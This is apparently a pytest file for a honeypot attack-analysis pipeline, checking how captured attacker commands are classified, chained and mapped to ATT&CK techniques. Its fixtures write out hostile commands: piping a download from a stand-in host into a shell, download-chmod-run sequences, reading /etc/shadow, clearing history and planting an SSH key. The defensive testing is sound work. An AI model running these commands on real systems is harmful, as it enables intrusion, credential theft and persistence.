from __future__ import annotations

import json

from production.classification.classification_pipeline import (
    NotebookParityClassifier,
    split_compound_command,
)
from production.reporting.threat_hypothesis import build_v2_report
from production.workers.session_monitor import SessionMonitor


class _Mitre:
    TACTICS = {
        "T1003": ["credential-access"],
        "T1033": ["discovery"],
        "T1059": ["execution"],
        "T1070": ["defense-evasion"],
        "T1082": ["discovery"],
        "T1105": ["command-and-control"],
        "T1222": ["defense-evasion"],
    }

    @classmethod
    def get_tactics(cls, tid):
        return cls.TACTICS.get(tid, [])

    @staticmethod
    def get_name(tid):
        return tid


def _command(session: str, second: int, text: str, *, outcome: str = "unknown") -> dict:
    eventid = {
        "success": "cowrie.command.success",
        "failure": "cowrie.command.failed",
    }.get(outcome, "cowrie.command.input")
    event = {
        "session": session,
        "src_ip": "192.0.2.10",
        "timestamp": f"2026-07-15T00:00:{second:02d}Z",
        "eventid": eventid,
        "input": text,
    }
    if outcome == "success":
        event["success"] = 1
    elif outcome == "failure":
        event["success"] = 0
    return event


def _payload(session_id: str, raw_events: list[dict]) -> dict:
    classifier = NotebookParityClassifier(mitre_db=_Mitre())
    monitor = SessionMonitor(
        mitre_db=_Mitre(),
        classification_fn=classifier.classify,
        classification_policy={"strategy": "notebook_merge"},
    )
    for event in raw_events:
        monitor.on_event(event)
    state = monitor.get_session(session_id)
    return {
        "session_id": session_id,
        "src_ip": state.src_ip,
        "commands": state.commands,
        "classification_events": state.classification_events,
        "raw_events": state.raw_events,
        "login_success": state.login_success,
    }


def _report(session_id: str, raw_events: list[dict]) -> dict:
    payload = _payload(session_id, raw_events)
    return build_v2_report({}, [payload], raw_events=payload["raw_events"])


def _relationship_types(report: dict) -> set[str]:
    return {
        item["relationship_type"]
        for item in report["observed_behavior"]["behavior_relationships"]
    }


def _claim_types(report: dict) -> set[str]:
    return {
        item["claim_type"]
        for item in report["supported_assessment"]["possible_objectives"]
    }


def test_connected_transfer_permission_execution_and_deletion_chain() -> None:
    session = "connected-artifact"
    events = [
        _command(session, 1, "wget https://example.invalid/a.sh -O /tmp/a.sh"),
        {
            "session": session,
            "src_ip": "192.0.2.10",
            "timestamp": "2026-07-15T00:00:02Z",
            "eventid": "cowrie.session.file_download",
            "url": "https://example.invalid/a.sh",
            "outfile": "/tmp/a.sh",
            "shasum": "a" * 64,
        },
        _command(session, 3, "chmod +x /tmp/a.sh", outcome="success"),
        _command(session, 4, "/tmp/a.sh"),
        _command(session, 5, "rm /tmp/a.sh", outcome="success"),
    ]
    report = _report(session, events)
    observed = report["observed_behavior"]
    relationships = _relationship_types(report)
    assert {
        "artifact_permission_change",
        "artifact_execution",
        "artifact_deletion",
        "cowrie_transfer_observed",
    }.issubset(relationships)
    chain = observed["connected_behavior_chains"][0]
    assert {
        "transfer_attempt",
        "permission_modification_attempt",
        "execution_attempt",
        "deletion_attempt",
        "cowrie_file_transfer_observed",
    }.issubset(set(chain["action_types"]))
    assert chain["chain_status"] == "partially_supported"
    claim = report["supported_assessment"]["connected_behavior_claims"][0]
    assert claim["claim_type"] == "connected_artifact_activity"
    assert "attempt" in claim["text"]
    assert set(claim["evidence_refs"]) == set(chain["evidence_refs"])
    deletion = next(
        item for item in observed["ordered_command_observations"]
        if item["command"] == "rm /tmp/a.sh"
    )
    assert deletion["action_types"] == ["deletion_attempt"]
    assert deletion["trusted_attck_mappings"] == []
    assert "possible_trace_removal" not in _claim_types(report)


def test_different_artifacts_and_same_basename_different_directories_do_not_link() -> None:
    different = _report("different-files", [
        _command("different-files", 1, "curl https://example.invalid/a -o /tmp/a"),
        _command("different-files", 2, "sh /tmp/b"),
    ])
    assert "artifact_execution" not in _relationship_types(different)
    assert "connected_transfer_execution" not in _claim_types(different)

    basename = _report("same-basename", [
        _command("same-basename", 1, "curl https://example.invalid/a -o /tmp/a"),
        _command("same-basename", 2, "sh /var/tmp/a"),
    ])
    assert "artifact_execution" not in _relationship_types(basename)
    paths = {
        item["normalized_value"]
        for item in basename["observed_behavior"]["normalized_entities"]
        if item["entity_type"] == "path"
    }
    assert {"/tmp/a", "/var/tmp/a"}.issubset(paths)


def test_curl_remote_access_file_output_and_pipe_have_distinct_semantics() -> None:
    webpage = _report("curl-page", [
        _command("curl-page", 1, "curl https://example.invalid/"),
    ])
    page_action = webpage["observed_behavior"]["ordered_command_observations"][0]
    assert page_action["action_types"] == ["remote_content_access"]
    assert "possible_tool_transfer_or_staging" not in _claim_types(webpage)

    output = _report("curl-output", [
        _command("curl-output", 1, "curl https://example.invalid/a.sh -o /tmp/a.sh"),
    ])
    output_action = output["observed_behavior"]["ordered_command_observations"][0]
    assert "transfer_attempt" in output_action["action_types"]
    assert output_action["entities"]["destination_paths"][0]["normalized_value"] == "/tmp/a.sh"
    assert "possible_tool_transfer_or_staging" in _claim_types(output)

    for shell in ("sh", "bash"):
        session = f"curl-pipe-{shell}"
        piped = _report(session, [
            _command(session, 1, f"curl https://example.invalid/a.sh | {shell}"),
        ])
        actions = piped["observed_behavior"]["ordered_command_observations"]
        assert [item["operator_after"] for item in actions] == ["|", ""]
        assert [item["operator_before"] for item in actions] == ["", "|"]
        assert "piped_to" in _relationship_types(piped)
        assert "piped_remote_content_execution_attempt" in _claim_types(piped)
        assert "possible_tool_transfer_or_staging" not in _claim_types(piped)
        assert not piped["observed_behavior"]["transfer_event_observations"]
        assert piped["follow_on_hypothesis"]["abstained"] is True
        assert (
            piped["follow_on_hypothesis"]["selection_semantics"]
            == "no_incomplete_connected_chain_abstention"
        )


def test_operator_metadata_preserves_conditionals_sequences_newlines_and_pipes() -> None:
    command = "a && b || c; d\ne | f"
    fragments = split_compound_command(command, split_pipes=True)
    assert [item.text for item in fragments] == ["a", "b", "c", "d", "e", "f"]
    assert [item.operator_after for item in fragments] == ["&&", "||", ";", "\\n", "|", ""]
    assert [item.operator_before for item in fragments] == ["", "&&", "||", ";", "\\n", "|"]
    default_fragments = split_compound_command("curl https://example.invalid/a | sh")
    assert len(default_fragments) == 1


def test_conditional_outcomes_are_fragment_scoped_or_explicitly_uncertain() -> None:
    original = "wget https://example.invalid/a -O /tmp/a && chmod +x /tmp/a"
    payload = {
        "session_id": "fragment-outcomes",
        "commands": [original],
        "raw_events": [],
        "classification_events": [
            {
                "original_command": original,
                "subcommand": "wget https://example.invalid/a -O /tmp/a",
                "subcommand_index": 0,
                "subcommand_count": 2,
                "operator_after": "&&",
                "command": "wget https://example.invalid/a -O /tmp/a",
                "ttp": "T1105",
                "tactic": "command-and-control",
                "source": "rule",
                "high_confidence": True,
                "event_timestamp": "2026-07-15T00:00:01Z",
                "command_outcome": "cowrie_reported_failure",
                "outcome_scope": "fragment",
                "evidence_id": "class-transfer-failed",
            },
            {
                "original_command": original,
                "subcommand": "chmod +x /tmp/a",
                "subcommand_index": 1,
                "subcommand_count": 2,
                "operator_before": "&&",
                "command": "chmod +x /tmp/a",
                "ttp": "T1222",
                "tactic": "defense-evasion",
                "source": "rule",
                "high_confidence": True,
                "event_timestamp": "2026-07-15T00:00:01Z",
                "command_outcome": "outcome_unknown",
                "outcome_scope": "fragment",
                "evidence_id": "class-chmod-unknown",
            },
        ],
    }
    report = build_v2_report({}, [payload])
    conditional = next(
        item for item in report["observed_behavior"]["behavior_relationships"]
        if item["relationship_type"] == "conditional_successor"
    )
    assert conditional["relationship_status"] == "partially_supported"
    assert "does not satisfy" in conditional["limitations"][0]

    uncertain = _report("compound-unknown", [
        _command("compound-unknown", 1, original),
    ])
    uncertain_relation = next(
        item for item in uncertain["observed_behavior"]["behavior_relationships"]
        if item["relationship_type"] == "conditional_successor"
    )
    assert uncertain_relation["relationship_status"] == "partially_supported"
    assert all(
        item["outcome_scope"] == "compound_event"
        for item in uncertain["observed_behavior"]["ordered_command_observations"]
    )

    unknown_fragment = {
        **payload,
        "session_id": "fragment-outcome-unknown",
        "classification_events": [
            {
                **payload["classification_events"][0],
                "command_outcome": "outcome_unknown",
                "evidence_id": "class-transfer-unknown",
            },
            {
                **payload["classification_events"][1],
                "evidence_id": "class-chmod-after-unknown",
            },
        ],
    }
    unknown_report = build_v2_report({}, [unknown_fragment])
    unknown_relation = next(
        item for item in unknown_report["observed_behavior"]["behavior_relationships"]
        if item["relationship_type"] == "conditional_successor"
    )
    assert unknown_relation["relationship_status"] == "partially_supported"
    assert unknown_relation["connects_behavior_chain"] is True
    assert len(unknown_report["observed_behavior"]["connected_behavior_chains"]) == 1


def test_transfer_event_links_by_path_but_timing_alone_is_insufficient() -> None:
    linked = _report("linked-download", [
        _command("linked-download", 1, "curl https://example.invalid/a -o /tmp/a"),
        {
            "session": "linked-download",
            "timestamp": "2026-07-15T00:00:02Z",
            "eventid": "cowrie.session.file_download",
            "outfile": "/tmp/a",
            "shasum": "b" * 64,
        },
    ])
    relationship = next(
        item for item in linked["observed_behavior"]["behavior_relationships"]
        if item["relationship_type"] == "cowrie_transfer_observed"
    )
    assert "matching_destination_path" in relationship["basis"]
    assert relationship["relationship_status"] == "supported"

    unlinked = _report("unlinked-download", [
        _command("unlinked-download", 1, "curl https://example.invalid/a -o /tmp/a"),
        {
            "session": "unlinked-download",
            "timestamp": "2026-07-15T00:00:02Z",
            "eventid": "cowrie.session.file_download",
            "shasum": "c" * 64,
        },
    ])
    assert "cowrie_transfer_observed" not in _relationship_types(unlinked)
    assert len(unlinked["observed_behavior"]["transfer_event_observations"]) == 1


def test_failed_downloader_does_not_prove_transfer_but_direct_event_is_retained() -> None:
    report = _report("failed-download", [
        _command("failed-download", 1, "curl https://example.invalid/a -o /tmp/a", outcome="failure"),
        {
            "session": "failed-download",
            "timestamp": "2026-07-15T00:00:02Z",
            "eventid": "cowrie.session.file_download",
            "outfile": "/tmp/a",
            "shasum": "d" * 64,
        },
    ])
    relationship = next(
        item for item in report["observed_behavior"]["behavior_relationships"]
        if item["relationship_type"] == "cowrie_transfer_observed"
    )
    assert relationship["relationship_status"] == "partially_supported"
    assert "conflict" in relationship["limitations"][0]
    assert "observed_cowrie_file_transfer" in _claim_types(report)


def test_unrelated_commands_remain_separate_and_do_not_form_a_chain() -> None:
    report = _report("unrelated", [
        _command("unrelated", 1, "whoami", outcome="success"),
        _command("unrelated", 2, "cat /etc/passwd"),
        _command("unrelated", 3, "history -c", outcome="success"),
    ])
    assert report["observed_behavior"]["connected_behavior_chains"] == []
    assert "possible_credential_access_preparation" in _claim_types(report)
    assert "possible_trace_removal" in _claim_types(report)
    assert report["supported_assessment"]["connected_behavior_claims"] == []


def test_repeated_commands_are_marked_duplicate_without_extra_evidence_diversity() -> None:
    report = _report("duplicates", [
        _command("duplicates", 1, "curl https://example.invalid/a -o /tmp/a"),
        _command("duplicates", 2, "curl https://example.invalid/a -o /tmp/a"),
        _command("duplicates", 3, "chmod +x /tmp/a"),
    ])
    actions = report["observed_behavior"]["ordered_command_observations"]
    assert actions[0]["duplicate_of"] == ""
    assert actions[1]["duplicate_of"] == actions[0]["evidence_id"]
    chain = report["observed_behavior"]["connected_behavior_chains"][0]
    assert chain["evidence_diversity_count"] == 2


def test_follow_on_uses_incomplete_connected_chain_not_unrelated_final_command() -> None:
    report = _report("chain-follow-on", [
        _command("chain-follow-on", 1, "curl https://example.invalid/a -o /tmp/a"),
        {
            "session": "chain-follow-on",
            "timestamp": "2026-07-15T00:00:02Z",
            "eventid": "cowrie.session.file_download",
            "outfile": "/tmp/a",
            "shasum": "e" * 64,
        },
        _command("chain-follow-on", 3, "whoami", outcome="success"),
    ])
    follow = report["follow_on_hypothesis"]
    assert follow["abstained"] is False
    assert follow["selection_semantics"] == "all_coherent_incomplete_chains_ordered_by_final_timestamp"
    assert follow["basis_connected_chain_ids"]
    assert follow["basis_last_evidence_id"] != follow["basis_session_last_trusted_evidence_id"]
    assert "No execution attempt linked" in follow["evidence_gaps"][0]["text"]


def test_legacy_payload_without_entity_metadata_remains_conservative() -> None:
    payload = {
        "session_id": "legacy-relationship",
        "commands": ["whoami"],
        "classification_events": [{
            "command": "whoami",
            "ttp": "T1033",
            "tactic": "discovery",
            "source": "rule",
            "confidence": 1.0,
            "high_confidence": True,
        }],
        "raw_events": [],
    }
    report = build_v2_report({}, [payload])
    observed = report["observed_behavior"]
    assert observed["ordered_behavior_chain"][0]["command"] == "whoami"
    assert observed["ordered_command_observations"][0]["command"] == "whoami"
    assert observed["connected_behavior_chains"] == []
    assert report["supported_assessment"]["assessment_status"] == "observed_behavior_only"
    assert report["follow_on_hypothesis"]["abstained"] is True


def test_relationship_layer_never_promotes_audit_only_attck_candidate() -> None:
    payload = {
        "session_id": "audit-action",
        "commands": ["rm /tmp/a"],
        "classification_events": [{
            "command": "rm /tmp/a",
            "ttp": "T1562",
            "tactic": "defense-evasion",
            "source": "securebert_low_confidence",
            "confidence": 0.2,
            "high_confidence": False,
            "evidence_id": "weak-t1562",
        }],
        "raw_events": [],
    }
    report = build_v2_report({}, [payload])
    action = report["observed_behavior"]["ordered_command_observations"][0]
    assert action["action_types"] == ["deletion_attempt"]
    assert action["trusted_attck_mappings"] == []
    assert "T1562" not in json.dumps(report["supported_assessment"])
    assert "T1562" not in json.dumps(report["follow_on_hypothesis"])


def test_account_and_credential_entities_are_literal_and_conservative() -> None:
    report = _report("account-entities", [
        _command("account-entities", 1, "useradd alice"),
        _command(
            "account-entities",
            2,
            "echo ssh-ed25519 AAAA >> /home/alice/.ssh/authorized_keys",
        ),
        _command("account-entities", 3, "cat /etc/shadow"),
    ])
    observed = report["observed_behavior"]
    assert "account_modified" in _relationship_types(report)
    entities = {
        (item["entity_type"], item["normalized_value"])
        for item in observed["normalized_entities"]
    }
    assert ("account", "alice") in entities
    assert ("path", "/home/alice/.ssh/authorized_keys") in entities
    assert ("path", "/etc/shadow") in entities
    account_relationship = next(
        item for item in observed["behavior_relationships"]
        if item["relationship_type"] == "account_modified"
    )
    assert account_relationship["relationship_status"] == "partially_supported"
    assert account_relationship["causality_semantics"] == "evidence_link_not_causal_proof"


def test_url_entities_remove_credentials_query_and_fragment() -> None:
    report = _report("url-redaction", [
        _command(
            "url-redaction",
            1,
            "curl 'https://demo:fake@example.invalid/a?token=fake#fragment' -o /tmp/a",
        ),
    ])
    url = next(
        item for item in report["observed_behavior"]["normalized_entities"]
        if item["entity_type"] == "url"
    )
    assert url["normalized_value"] == "https://example.invalid/a"
    assert url["original_value"] == "https://example.invalid/a"
    assert url["redacted_components"] is True
    assert "token" not in json.dumps(url)
